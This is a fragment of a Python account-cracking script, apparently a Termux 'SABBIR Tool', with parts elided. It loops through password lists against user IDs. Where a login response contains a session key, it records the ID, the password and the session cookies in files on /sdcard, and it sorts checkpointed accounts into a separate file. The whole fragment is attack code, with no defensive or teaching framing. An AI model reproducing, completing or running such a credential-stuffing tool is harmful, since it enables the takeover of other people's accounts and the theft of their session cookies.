...
{WHITE}================================================
        \033[1;35m Welcome To SABBIR Tool \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/SABBIR-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [SR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SR. SABBIR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [SR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
